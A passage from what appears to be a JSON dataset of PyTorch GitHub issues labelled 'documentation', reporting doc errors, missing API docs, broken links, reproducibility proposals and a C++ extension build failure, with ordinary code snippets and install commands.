be calculated.\r\n```\r\n\r\nWhen `p` is specified and `dim` is a 2-tuple, I would expect `torch.norm` to compute an induced matrix norm, but instead it computes an L_p norm (vector norm) over a flattened matrix.\r\n\r\nFor example:\r\n```python\r\nIn [1]: import torch\r\n\r\nIn [2]: x = torch.eye(3, 3)\r\n\r\nIn [3]: torch.norm(x, p=1, dim=(-2, -1)) # dim is a tuple, want a matrix norm\r\nOut[3]: tensor(3.) # should be 1 in case of 1 induced matrix norm\r\n\r\n```\r\n\r\n\r\ncc @jlin27"},{"labels":["documentation",null],"text":"## Background\r\nThis post is to gather feedback on the proposal to split up larger doc pages (e.g. torch.html) into subpages to reduce load time and help with content searchability. This is done by adding a summary table in the main page that links to subpages for each function/class.\r\n\r\nMore details can be found in this PR: https://github.com/pytorch/pytorch/issues/38010\r\n\r\n*Known Issue:* New format generates new urls which would break existing documentation links. *Proposed Fixes:*\r\nhttps://github.com/pytorch/pytorch/pull/39086\r\nhttps://github.com/pytorch/pytorch/pull/39032\r\n\r\n## Feedback Instructions\r\n1. Review the current view for torch compared to the newly proposed view: \r\n* Current: https://pytorch.org/docs/stable/torch.html\r\n* Proposed New: https://5591729-65600975-gh.circle-artifacts.com/0/docs/torch.html\r\n\r\n2. Leave a comment highlighting:\r\n* Pros\r\n* Cons\r\n* Which option do you prefer and why? \n\ncc @jlin27"},{"labels":["documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\nI am following the following documentation;\r\n\r\nhttps://pytorch.org/docs/master/rpc.html#torch.distributed.rpc.rpc_async\r\n\r\nWhen I use the given export commands, the program breaks showing that \r\n\r\nFor Address ENV\r\n\r\n```bash\r\nraise _env_error(\"MASTER_ADDR\")\r\nValueError: Error initializing torch.distributed using env:// rendezvous: environment variable MASTER_ADDR expected, but not set\r\n```\r\n\r\nFor PORT ENV\r\n```bash\r\n raise _env_error(\"MASTER_PORT\")\r\nValueError: Error initializing torch.distributed using env:// rendezvous: environment variable MASTER_PORT expected, but not set\r\n```\r\n\r\nModified as follows, fixes the error. \r\n\r\n```bash\r\nexport MASTER_ADDR=localhost\r\nexport MASTER_PORT=5678\r\n```\r\n\r\nI tested this with the following way\r\n\r\n```bash\r\npython3 -m venv ENV\r\nsource activate ENV/bin/activate\r\npip3 install torch\r\n```\r\n\r\nScript `test_torch_dist.py'\r\n\r\n```python\r\nimport sys\r\nimport torch\r\nimport torch.distributed.rpc as rpc\r\n\r\n\r\ndef p1():\r\n    print(\r\n        \"Worker 1\"\r\n    )\r\n    rpc.init_rpc(\"worker0\", rank=0, world_size=2)\r\n    fut1 = rpc.rpc_async(\"worker1\", torch.add, args=(torch.ones(2), 3))\r\n    fut2 = rpc.rpc_async(\"worker1\", min, args=(1, 2))\r\n    result = fut1.wait() + fut2.wait()\r\n    print(result)\r\n    rpc.shutdown()\r\n\r\ndef p2():\r\n    print(\r\n        \"Worker 2\"\r\n    )\r\n    rpc.init_rpc(\"worker1\", rank=1, world_size=2)\r\n    rpc.shutdown()\r\n\r\n\r\nargs = sys.argv\r\n\r\nprint(\"Args {}\".format(int(args[1])))\r\n\r\nif int(args[1]) == 1:\r\n    p1()\r\n\r\nif int(args[1]) == 2:\r\n    p2()\r\n\r\n```\r\n\r\nTerminal 1:\r\n\r\n```bash\r\npython3 test_torch_dist.py 1\r\n```\r\n\r\nTerminal 2:\r\n\r\n```bash\r\npython3 test_torch_dist.py 2\r\n```\r\n\r\nMachine configs: \r\n```bash\r\nlsb_release -a\r\n\r\nDistributor ID: Ubuntu\r\nDescription:    Ubuntu 20.04 LTS\r\nRelease:        20.04\r\nCodename:       focal\r\n```\r\n\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jlin27 @jjlilley"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nIn the Tensor API documentation page.\r\n\r\nI saw \r\n\r\n> self, index and src should have same number of dimensions. It is also required that index.size(d) <= src.size(d) for all dimensions d, and that index.size(d) <= self.size(d) for all dimensions d != dim.\r\n\r\nBut when I look at size() API. \r\n\r\nhttps://pytorch.org/docs/stable/tensors.html#torch.Tensor.size\r\nIt doesn't mention it can take an argument. Is something missing?\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 🚀 Feature\r\n\r\nCurrently, the [recommended approach to achieve reproducibility](https://pytorch.org/docs/stable/notes/randomness.html) is setting global random seeds. I would like to propose that instead all functions which need a random source accept a local, non-global, `random_seed`/`random_state` argument to which one can pass a random state object, or numpy generator, or something else, which binds random source locally.\r\n\r\n## Motivation\r\n\r\nReproducibility if often needed in ML programs. But current approach of setting global random seed in various places in pytorch is suitable only for small programs which are using only pytorch. Now imagine that you have many libraries around, each trying to set global random seed at various times. This can lead to strange changes in random seeds just because you swapped two calls around. Moreover, if any of those libraries stand-alone produces a sequence of numbers, it might be that when used in combination with pytorch the sequence is not anymore the same. So if you are trying to compare two different implementations (one in pytorch one in some other library), the behavior of the implementation in the other library can change just because you also have pytorch around.\r\n\r\nOf course, the other library should also not be using global random source. But ideally pytorch should not either.\r\n\r\nIn our concrete case, we have an AutoML system generating many candidate pipelines using primitives to build those pipelines which in turn use many different libraries. Those pipelines are run and we hope to have full reproducibility (which helps with metalearning). But setting/resetting global random seed just because one primitive in one candidate pipeline we are exploring happens to use pytorch influences behavior of unrelated pipelines.\r\n\r\n## Pitch\r\n\r\nInstead of relying on global random sources, add `random_state` parameter to all functions which expect/use randomness. Do not ever set random seed of a global random source in pytorch code (the user of pytorch can do that themselves if they really want).\r\n\r\n## Alternatives\r\n\r\nUse context managers to set and reset random seeds, but this becomes tricky when using multi-threading.\r\n\r\n## Additional context\r\n\r\nSee example in [sklearn](https://scikit-learn.org/stable/glossary.html#term-random-state).\n\ncc @jlin27 @pbelevich"},{"labels":[null,"documentation",null],"text":"The only mention of this in the doc is \r\nhttps://github.com/pytorch/pytorch/blob/0251ba61089795a7a27c0473e4bb022805432c1f/torch/distributed/distributed_c10d.py#L337-L341\r\nwith no example. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jlin27"},{"labels":["documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\nThe information regarding the [_add_graph()_ function in the Tensorboard doc](https://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_graph) is empty. The missing info seems to be there in its [source](https://pytorch.org/docs/stable/_modules/torch/utils/tensorboard/writer.html#SummaryWriter.add_graph) tough. \r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\nCurrently, it is a bit tricky to switch from CPU build to CUDA build. Users will sometimes forget to specify the cudatoolkit requirement and find out that they installed the CPU build. Then they will attempt to follow the steps on pytorch.org, that is `conda install -c pytorch cudatoolkit=x.x pytorch`. But actually that is not enough because `cpuonly` is still there.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. `conda install -c pytorch cpuonly pytorch`\r\n2. `conda install -c pytorch cudatoolkit=x.x pytorch`\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nBetter user message. \r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the getting started section [this](https://pytorch.org/get-started/locally/#linux-from-source) section the following quote appears:\r\n\r\n> You will also need to build from source if you want CUDA support.\r\n\r\nI guess this is from previous versions where CUDA support was not built-in and this can be removed, correct?\n\ncc @ezyang @gchanan @zou3519 @jlin27"},{"labels":["documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\nWhen the median value lies between two elements, torch.median returns the floor instead of the average.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. start a python shell\r\n2. run torch.tensor([1, 2, 3, 4]).median()\r\n3. observe the result is 2 instead of 2.5\r\n\r\n```\r\nimport torch\r\ntorch.tensor([1, 2, 3, 4]).median()\r\n```\n\ncc @jlin27 @mruberry"},{"labels":["documentation",null,null],"text":"We should add the appropriate documentation, registration, and tests. See also https://github.com/pytorch/pytorch/issues/36403. \r\n\r\n@albanD \n\ncc @suo @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nAccording to the [documentation](https://pytorch.org/docs/stable/cpp_extension.html#torch.utils.cpp_extension.verify_ninja_availability), the `verify_ninja_availability()` function should return True if Ninja is available on the user system.\r\n\r\nHowever, quickly looking at the implementation shows that it returns nothing and just raises a RuntimeError if ninja is not available.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\n# Run on system with and without Ninja\r\n\r\nfrom torch.utils.cpp_extension import verify_ninja_availability\r\nverify_ninja_availability()   # Does not return bool\r\n```\r\n\r\n## Expected behavior\r\n\r\nEither the documentation should be updated to correctly tell it will raise an error, or the function itself should be modified to return a boolean.\r\n\r\nPersonally, I am more in favor of returning a boolean, as it is annoying to need to wrap a function in a try/except.\r\n\r\n## Environment\r\nPyTorch version: 1.5.0+cu101\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration:\r\nGPU 0: Quadro M2000\r\nGPU 1: GeForce GTX 1080 Ti\r\n\r\nNvidia driver version: 418.56\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] lightnet-torch==1.1.0\r\n[pip3] numpy==1.16.1\r\n[pip3] torch==1.5.0+cu101\r\n[pip3] torchfile==0.1.0\r\n[pip3] torchsummary==1.5.1\r\n[pip3] torchvision==0.6.0+cu101\r\n[conda] Could not collect\r\n\n\ncc @yf225 @glaringlee"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/quantization.html#torch.quantization.add_quant_dequant\r\n\r\n#### API\r\n\r\n`torch.quantization.add_quant_dequant` \r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input :\r\n\r\n**we want to quantize** (*that*) –\r\n\r\nwhich should be part of the description for input argument `module`\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/torch.html#torch.add\r\n\r\n#### API\r\n\r\n`torch.add`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `value` , but it is not in the signature, and it is not accepted by the function. It should be `other`\r\n\r\nRunning code :\r\n\r\n~~~python\r\na = torch.randn(4)\r\ntorch.add(a, other=20, value=1)\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: add() got an unexpected keyword argument 'value'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version: 1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\r\n"},{"labels":["documentation",null,null],"text":"When the PR that enables async user function for `rpc.remote` is added to the stack started from #39216, update the master `rpc.rst` doc to mention it in `rpc.rpc_sync`, `rpc.rpc_async`, and `rpc.remote` APIs.\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/master/generated/torch.nn.BatchNorm2d.html\r\n\r\nHere the var[x] of the denominator is population variance dividing by N. It should be precisely clarified here. Otherwise, the reader may use the sample variance by calling tensor.var() which is divided by N - 1.  "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/torch.html#torch.mul\r\n\r\n#### API\r\n\r\n`torch.mul` \r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there are inputs :\r\n\r\n**{input}** –\r\n\r\n**{out}** –\r\n\r\n\r\n\r\nAnd input argument `value` is not in the signature, which is also not accepted by the function. It should be `other`\r\n\r\nRunning code:\r\n\r\n~~~python\r\na = torch.randn(3)\r\ntorch.mul(a, other=100, value=100)\r\n~~~\r\n\r\ngot exception:\r\n\r\n~~~python\r\nTypeError: mul() got an unexpected keyword argument 'value'\r\n~~~\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.5.0\r\n- Python version: 3.8.2"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/jit.html#torch.jit.trace_module\r\n\r\n#### API\r\n\r\n`torch.jit.trace_module`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `example_inputs`, but it is not in the signature, and it is not accepted by the function. It should be `inputs`\r\n\r\nRunning the example code from the document:\r\n\r\n~~~python\r\nimport torch.nn as nn\r\n\r\nclass Net(nn.Module):\r\n    def __init__(self):\r\n        super(Net, self).__init__()\r\n        self.conv = nn.Conv2d(1, 1, 3)\r\n\r\n    def forward(self, x):\r\n        return self.conv(x)\r\n\r\n    def weighted_kernel_sum(self, weight):\r\n        return weight * self.conv.weight\r\n\r\n\r\nn = Net()\r\nexample_weight = torch.rand(1, 1, 3, 3)\r\nexample_forward_input = torch.rand(1, 1, 3, 3)\r\n\r\n# Trace a specific method and construct `ScriptModule` with\r\n# a single `forward` method\r\nmodule = torch.jit.trace(n.forward, example_forward_input)\r\n\r\n# Trace a module (implicitly traces `forward`) and construct a\r\n# `ScriptModule` with a single `forward` method\r\nmodule = torch.jit.trace(n, example_forward_input)\r\n\r\n# Trace specific methods on a module (specified in `inputs`), constructs\r\n# a `ScriptModule` with `forward` and `weighted_kernel_sum` methods\r\ninputs = {'forward' : example_forward_input, 'weighted_kernel_sum' : example_weight}\r\n~~~\r\n\r\nand calls the function: \r\n\r\n~~~python\r\nmodule = torch.jit.trace_module(n, example_inputs=inputs)\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: trace_module() got an unexpected keyword argument 'example_inputs'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: macOS Mojave 10.14\r\n- PyTorch version:  1.5.0\r\n- Python version: 3.8.2\r\n\r\n\r\ncc @suo"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nThe document enclosing the details of how one installs the C++ distribution of Pytorch, found [here](https://pytorch.org/cppdocs/installing.html), is missing one paragraph of code between the sentences _In that case CMake configuration step would look something like follows:_ and _If all goes well, it will look something like this:_\r\n\r\nApologies if this is not the place to report this, this was the best fit according to the template text.\r\n\n\ncc @yf225 @glaringlee"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nAs title, `torch.backends` is undocumented\r\n\r\nRelated issue: https://github.com/pytorch/pytorch/issues/12468\r\n\r\nFYI, here is the search suggestions for `torch.b`. Seems that many people are searching for `torch.backends.cudnn.{benchmark, deterministic, enabled}`\r\n![image](https://user-images.githubusercontent.com/6421097/83131164-0b6d9380-a0a5-11ea-8a52-f4e340cf4e82.png)\r\n\r\n"},{"labels":[null,null,"documentation",null],"text":"Originally in https://github.com/pytorch/pytorch/issues/18095#issuecomment-633149307:\r\n\r\n@vadimkantorov:\r\nWorks: https://pytorch.org/docs/stable/torch.html#torch.flip\r\nBreaks: https://pytorch.org/docs/master/torch.html#torch.flip\r\n\r\n@t-vi:\r\nThey're now separate pages: https://pytorch.org/docs/master/generated/torch.flip.html#torch.flip\r\n...but it would break many links, including on the forums.\r\n\r\n@ezyang:\r\nYes, this will be a release blocker for next release.\r\n\r\ncc @ezyang @gchanan @zou3519 @mattip"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nI am trying to understand what the function \"coalesce\" does for sparse tensors [here](https://pytorch.org/docs/stable/sparse.html#torch.sparse.FloatTensor.coalesce). However, the API is not provided. \r\n\n\ncc @vincentqb"},{"labels":[null,"documentation",null,null],"text":"`torch.cuda.nccl` seems meant to be a set of low-level API (compared to `torch.cuda.comm` and `torch.distributed`). It would be great to document it.\n\ncc @ngimel"},{"labels":[null,null,"documentation",null],"text":"`torch.cuda.comm` and `torch.distributed` have similar but subtly different API sets. It would be great to make them consistent, and document the former.\n\ncc @ngimel @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar"},{"labels":["documentation",null],"text":"This is a summary of the potential doc improvements that I came up with. I can work on a pull request for these changes after review of what changes need to be made.\r\n\r\n1. Make clear that `torch.set_default_dtype` and `torch.get_default_dtype` only affect `torch.Tesor` and not `torch.tensor`.\r\n   \r\n    Suggestion:-\r\n    In [torch.set_default_dtype](https://pytorch.org/docs/stable/torch.html#torch.set_default_dtype) change:\r\n    The default floating point dtype is initially `torch.float32`. -> The default floating-point dtype used by `torch.Tensor` is initially `torch.float32`.\r\n\r\n    In [torch.get_default_dtype](https://pytorch.org/docs/stable/torch.html#torch.get_default_dtype) change:\r\n    Get the current default floating-point `torch.dtype` -> Get the current default floating point `torch.dtype` used by `torch.Tensor`.\r\n\r\n2. Specify the default value of **sci_mode** in [torch.set_printoptions](https://pytorch.org/docs/stable/torch.html#torch.set_printoptions). \r\n\r\n    Currently, it says to look for the default value defined by _Formatter. But to get to the default value a lot of work has to be done like:\r\n    ```python\r\n    torch.set_printoptions??  # Get location `torch/_tensor_str.py`\r\n    torch._tensor_str._Formatter??  # Default value defined in the __init__ method of this class\r\n    ```\r\n\r\n    Suggestion:-\r\n    Specify the default value of `False` in the docs or specify the exact path of `_Formatter` as `torch._tensor_str._Formatter`.\r\n\r\n3. The header of [torch.full_like](https://pytorch.org/docs/stable/torch.html#torch.full_like) is placed incorrectly.\r\n\r\n4. Add example for [torch.split](https://pytorch.org/docs/stable/torch.html#torch.split).\r\n\r\n5. Add a note/warning in [torch.squeeze](https://pytorch.org/docs/stable/torch.html#torch.squeeze). When using batch_size=1, using torch.squeeze can result in an error. So add a warning telling the users to be careful when using torch.squeeze.\r\n\r\n6. The header of [torch.randint(low=0, high, size](https://pytorch.org/docs/stable/torch.html#torch.randint) is placed incorrectly.\r\n\r\n7. The header of [torch.randint_like](https://pytorch.org/docs/stable/torch.html#torch.randint_like) is placed incorrectly.\r\n   \r\n8. Add documentation for `_use_new_zipfile_serialization=False` argument of [torch.save](https://pytorch.org/docs/stable/torch.html#torch.save) + Add example using the above argument and pickle_protocol=4/5.\r\n\r\n9. "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nMany classes, methods and functions lack docstrings. They should be added or clear reasons provided for not documenting them. xref gh-38244 which refactored the documentation coverage checks: the undocumented items are all listed in `docs/source/conf.py` in `coverage_ignore*` lists"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nFunctions with multiline signature are not properly displayed in the online docs\r\n\r\nTake `randint` as an example, the function signature takes two lines in the docstring. \r\n\r\nhttps://github.com/pytorch/pytorch/blob/15da26f8aafe50fb34d343d872c7461546d7a317/torch/_torch_docs.py#L4667-L4670\r\n\r\nBut on the docs website https://pytorch.org/docs/master/generated/torch.randint.html, the second line is not recognized as part of the function signature. \r\n\r\n![image](https://user-images.githubusercontent.com/6421097/82273101-21ab7f00-9942-11ea-8e9b-717d3fa52684.png)\r\n\r\nA similar issue happens to the index page as well: the second column shows the first line of the signature, instead of the description. \r\n\r\n![image](https://user-images.githubusercontent.com/6421097/82273128-3d168a00-9942-11ea-9f95-64cb698f4cb4.png)\r\n\n\ncc @ezyang @zou3519"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIt would be nice to have explicit statement in the documentation that `torch.optim.lr_scheduler.ReduceLROnPlateau` with `mode=min` and `threshold_mode='rel'` expects loss to be `> 0`\r\n\r\nThis is the excerpt from documentation about `threshold_mode`:\r\n```\r\nthreshold_mode (str): One of `rel`, `abs`. In `rel` mode,\r\ndynamic_threshold = best * ( 1 + threshold ) in 'max'\r\nmode or best * ( 1 - threshold ) in `min` mode.\r\nIn `abs` mode, dynamic_threshold = best + threshold in\r\n`max` mode or best - threshold in `min` mode. Default: 'rel'.\r\n```\r\n\r\nAnd this is the corresponding excerpt from the code:\r\n```python\r\ndef is_better(self, a, best):\r\n    if self.mode == 'min' and self.threshold_mode == 'rel':\r\n        rel_epsilon = 1. - self.threshold\r\n        return a < best * rel_epsilon\r\n\r\n    elif self.mode == 'min' and self.threshold_mode == 'abs':\r\n        return a < best - self.threshold\r\n\r\n    elif self.mode == 'max' and self.threshold_mode == 'rel':\r\n        rel_epsilon = self.threshold + 1.\r\n        return a > best * rel_epsilon\r\n\r\n    else:  # mode == 'max' and epsilon_mode == 'abs':\r\n        return a > best + self.threshold\r\n```\r\n\r\nI use `NegativeDiceLoss` in my experiments so the loss is negative and is expected to be minimized. The only correct mode of `ReduceLROnPlateau` I can use is `threshold_mode='abs'` because `threshold_mode='rel'` will not work for minimizing negative loss.\r\n\r\nImagine `mode='min', threshold_mode='rel', threshold=0.1`:\r\n* If we use loss that is expected to be > 0 all the time and current loss value is `10` than dynamic threshold will be `(1 - 0.1) * 10 == 9`. And the check will be `a < 9`. So there will be a margin between previous loss value and the new one to ensure that model improved.\r\n* If we use loss that is expected to be < 0 all the time (as in my case with `NegativeDiceLoss`) and current loss value is `-10` than dynamic threshold will be `(1 - 0.1) * -10 == -9`. And the check will be `a < -9`. __It does not correspond to logic of scheduler__ as it allows new loss value to be slightly worse than previous. As I understand the goal of the dynamic threshold is to guarantee that the loss improved __by some margin__ to deal with noise in loss calculations.\r\n\r\nIf my understanding is correct it is better to __explicitly state in documentation__ that for `threshold_mode='rel'` only positive loss functions are expexted. Probably negative loss functions are not common to use but sometimes they are required (as with dice score as loss function).\r\nPlease correct me if I'm wrong :)"},{"labels":["documentation",null],"text":"The editors portion of the CITATION file located [here](https://github.com/pytorch/pytorch/blob/master/CITATION) is not formatted properly. Specifically this part:\r\n\r\n`editor = {H. Wallach and H. Larochelle and A. Beygelzimer and F. d\\textquotesingle Alch\\'{e}-Buc and E. Fox and R. Garnett}`\r\n\r\nMy goal is to make the citation work with [citeas.org](https://citeas.org). But I had to ignore that part of the citation to make it work."},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nMore often than not, integer quantization is performed by \"simulating\" quantisation during the forward pass and let the gradients flow unchanged during back propagation (i.e. using Straight Through Estimator, STE). \r\n\r\nFrom the description in [FakeQuantize](https://pytorch.org/docs/stable/_modules/torch/quantization/fake_quantize.html#FakeQuantize) I think it's fair to assume that STE is used since nothing is mentioned about what happens during backward pass. However, FakeQuantize does not use STE. (evidence [here](https://github.com/pytorch/pytorch/blob/fe44741dbac80c73139306f46da8b719d44444d3/aten/src/ATen/native/quantized/cuda/fake_quantize_core.cu#L67) showing the CUDA implementation). The backward pass does gradient clipping. \r\n\r\nI think this should be mentioned (maybe as a \"Note\"?) in the DOCs since these two approaches for backward prop can lead to very different results in some cases. \n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThere are three minor problems in the `torch.norm` docs:\r\nThe default value of `torch.norm`'s `p` parameter is `fro`, but at the same time, the table of values for `ord` (Bug 1: mismatch to the parameter name) lists no vector norm for `ord=\"fro\"` (only for `ord=None`) (Bug 2). Finally, the quote signs are wrong (Bug 3).\r\n"},{"labels":["documentation",null,null],"text":"## 🚀 Feature\r\nThe current official docs don't have specific examples regarding the use of seeds and worker_init_fn in order to attain a certain degree of reproducibility.\r\nFollowing the suggestion by @ptrblck in the [thread](https://discuss.pytorch.org/t/reproducibility-with-all-the-bells-and-whistles/81097), I would like to add the solutions mentioned to the official docs.\r\n\r\n## Motivation\r\nWhile participating in a Kaggle competition I ended up spending countless hours of GPU compute on reproducing my results across followup runs of the pipeline but I realized it too late that the number of workers, the seeds **inside** these works all affect the outcome of the run. I searched a lot of discussions and docs to end up realizing how to use the worker_init_fn and what to expect from it. I would not want people to end up where I did so I would like to give them a heads up with whatever I have understood.\r\n\r\n## Pitch\r\nAs suggested by @ptrblck , I would like to update the [doc](https://pytorch.org/docs/stable/notes/randomness.html) with the code examples and give people a clear heads-up regarding the dependency of the results on the workers and seeds and how they may be able to reach an acceptable level of reproducibility.\r\n\r\n## Alternatives\r\nAs far as I can tell, this would be the most thorough example.\r\n\r\n## Additional context\r\nN/A\r\n\n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation MISSING\r\n\r\n Currently, the only documentation on the pages says \"The author of this package has not provided a project description\"\r\n\r\nCan I have permission or a contact person to call so I can help add more instructions, a README.md or work to implement existing pages that need documentation? \r\n\r\nThe <Project description> on website https://pypi.org/project/torch/ is where I am referencing and I would be happy to start adding documentation as Torch is on my list of things to learn. -->\r\n\r\n<!-- Currently, the only documentation on the pages says \"The author of this package has not provided a project description\"\r\n\r\nCan I have permission or a contact person to call so I can help add more instructions, a README.md or work to implement existing pages that need documentation? \r\n\r\nThe <Project description> on website https://pypi.org/project/torch/ is where I am referencing and I would be happy to start adding documentation as Torch is on my list of things to learn. -->\r\n\n\ncc @malfet"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nTo reproduce:\r\n- go to https://pytorch.org/docs/master/generated/torch.geqrf.html?highlight=geqrf#torch.geqrf\r\n- Click  \"Click here to view docs for latest stable release.\"\r\n- Watch as it leads to a 404 page.\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/master/nn.functional.html#torch.nn.functional.upsample\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/81728167-07f8cc00-9458-11ea-913f-8928a4bd3ab9.png)\r\n\r\nIt says it \"has to be an integer\", but the parenthesis says it can be a \"float or Tuple[Float]\".\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nI was going through the [https://pytorch.org/tutorials/recipes/recipes/loading_data_recipe.html](new) documentation. I tried to run the google colab notebook and looks like there is this error. "},{"labels":[null,null,null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nDear community,\r\n\r\nI am a dev from [KeOps project](https://github.com/getkeops/keops/) building optimized operations written in C++/Cuda that are compatible with pytorch (among others scientific languages). \r\n\r\nWe successfully build python modules compatible with pyTorch since the pyTorch v0.2... But the last v1.5 broke our modules with a runtime error complaining about [missing symbols](https://github.com/getkeops/keops/issues/59).\r\n\r\n\r\nTo simplify the analysis you may find below a minimal working example that builds a module through pybind11n the spirit of [pytorch doc](https://pytorch.org/tutorials/advanced/cpp_frontend.html#writing-a-basic-application). \r\n\r\nIt should output a file `test_module.cpython-38-x86_64-linux-gnu.so` that can be imported from python. This module works well when building with pytorch 1.4 but raised a runtime error when building with pytorch v1.5. \r\n\r\n\r\n## To Reproduce\r\n\r\nAssuming pyTorch and pybind11 installed (e.g. through conda).  There are 2 files\r\n\r\n`module_test.cpp` contains\r\n\r\n```cpp\r\n#include <torch/extension.h>\r\n#include <pybind11/pybind11.h>\r\n// Main function\r\nat::Tensor foo(int s) {\r\n     return torch::eye(s);\r\n}    \r\n\r\n// PyBind11 entry point \r\nPYBIND11_MODULE(test_module, m) {\r\nm.def(\"foo\", &foo, \"Entry point to test module\");\r\n}\r\n```   \r\nand `CMakeList.txt` contains\r\n```\r\nproject(test_module LANGUAGES CXX)\r\n\r\nfind_package(Torch REQUIRED)\r\nfind_package(pybind11  REQUIRED)\r\n\r\npybind11_add_module(test_module ${CMAKE_CURRENT_SOURCE_DIR}/test_module.cpp)\r\ntarget_link_libraries(test_module PUBLIC \"${TORCH_LIBRARIES}\")\r\n```\r\nit can be compile with\r\n\r\n ```bash\r\n$ mkdir build\r\n$ cd build\r\n$ cmake -DCMAKE_PREFIX_PATH=\"/home/bcharlier/.conda/envs/keops/lib/python3.8/site-packages/torch/\" .. && make\r\n```\r\nand run with (note that `torch` is imported first)\r\n```\r\n$ python -c \"import torch; print(torch.__version__); import test_module; print(test_module.foo(3))\"\r\n\r\n1.5.0\r\nTraceback (most recent call last):\r\n  File \"<string>\", line 1, in <module>\r\nImportError: /home/bcharlier/src/test_module/build/test_module.cpython-38-x86_64-linux-gnu.so: undefined symbol: _Z16THPVariable_WrapN2at6TensorE\r\n```\r\nThe missing symbol is not exactly the same when 